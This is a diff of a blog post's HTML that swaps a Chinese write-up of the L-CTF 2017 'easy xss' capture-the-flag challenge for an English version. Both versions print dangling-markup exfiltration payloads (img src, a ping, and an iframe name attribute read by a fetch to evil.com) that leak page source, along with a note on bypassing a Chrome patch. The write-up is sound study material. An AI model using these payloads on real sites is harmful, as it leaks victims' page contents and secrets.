@@ -51,19 +51,20 @@
   <h1 class="post-title">L-CTF 2017 easy xss</h1>
   <section class="post-content article-entry">
     <p>L-CTF 2017 easy xss</p>
-<p>本题目存在两种解法,已经在官方wp中予以阐述</p>
-<p>着重说一下针对html解释器的攻击部分。</p>
-<p>来源于 <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=680970" target="_blank" rel="external">https://bugs.chromium.org/p/chromium/issues/detail?id=680970</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p>
-<p>使用标签的src属性,吃掉后面的源码,并泄露出去。</p>
-<p>为了降低难度,使用的chrome版本里是具有这个漏洞的</p>
-<p>但其实最新版本仍然可以绕过patch加以利用,有两种方式的POC</p>
-<p>需要交互的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a ping=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p>
-<p>由于需要交互,比较鸡肋,实践中用不上。</p>
-<p>并不需要交互的:</p>
+<p>2 ways to solve it , all in the writeup</p>
+<p>the key point is how to leak the information through the html parser</p>
+<p>from <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=680970" target="_blank" rel="external">https://bugs.chromium.org/p/chromium/issues/detail?id=680970</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p>
+<p>the src attribute would eat the html sourcecode until next ‘</p>
+<p>to make it easier, I use the old chrome to perform this challenge</p>
+<p>but,there is still some skills to bypass the patch in the stable version</p>
+<p>there are 2 ways:</p>
+<p>need interactive<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a ping=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p>
+<p>it’s hard to use in a real attack</p>
+<p>without interactive</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&apos;//evil.com/evil.html&apos; name=&apos;</div></pre></td></tr></table></figure>
-<p>在evil.html中</p>
+<p>evil.html</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">fetch(&apos;//evil.com/?p=&apos;+escape(name))</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>即可获取泄露的内容</p>
+<p>then we get the leak sourcecode,which contains the flag.</p>
 
   </section>
   <footer class="post-footer">
